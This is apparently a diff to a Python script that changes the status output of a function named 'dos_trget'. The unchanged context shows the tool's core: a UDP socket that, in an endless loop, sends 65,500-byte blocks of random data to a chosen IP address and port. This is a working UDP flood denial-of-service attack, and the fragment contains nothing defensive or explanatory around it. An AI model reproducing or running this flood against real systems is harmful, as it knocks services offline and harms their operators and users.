@@ -52,19 +52,17 @@ def clear():
 #
 def dos_trget(target,st,portp):
 #
-    bytes_num = 0
     if st == ("ip"):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 #
     while True:
-        bytes_num = bytes_num + 1
         try:
             if st == ("ip"):
                 try:
 #
                     bytes = random._urandom(65500)
                     sock.sendto(bytes,(target, portp))
-                    print(Fore.GREEN + f"{bytes_num} sended to {target}")
+                    print(Fore.GREEN + f"bytes sended to {target}")
 #
                 except:
                     try:
